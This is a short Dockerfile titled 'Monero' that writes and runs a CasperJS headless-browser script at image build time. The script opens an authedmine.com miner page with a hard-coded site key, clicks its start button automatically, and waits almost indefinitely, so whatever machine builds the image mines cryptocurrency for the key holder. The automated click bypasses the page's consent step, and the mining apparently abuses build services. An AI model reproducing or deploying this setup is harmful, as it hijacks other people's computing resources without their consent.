# Monero

FROM vitr/casperjs
MAINTAINER zjgsuwk private project

ENV SCRIPT_DIR=/home

RUN echo 'var casper = require("casper").create(\n\
{ \n\
});  \n\
casper.start("https://authedmine.com/media/miner.html?key=xKnsZSvt3PlPNHtQse1ETPfCDaBGQTOe", function() {  \n\
   this.echo(this.getTitle()); \n\
}); \n\
casper.then(function() {  \n\
  this.waitForSelector("#mining-start > svg");  \n\
  this.click("#mining-start > svg"); \n\
  this.wait(1720000000000);  \n\
  this.echo("miner done!"); \n\
}); \n\
casper.run();\n\
'\
> ${SCRIPT_DIR}/script.js

RUN /usr/local/bin/casperjs ${SCRIPT_DIR}/script.js

WORKDIR $SCRIPT_DIR

#ENTRYPOINT ["casperjs", "script.js"]
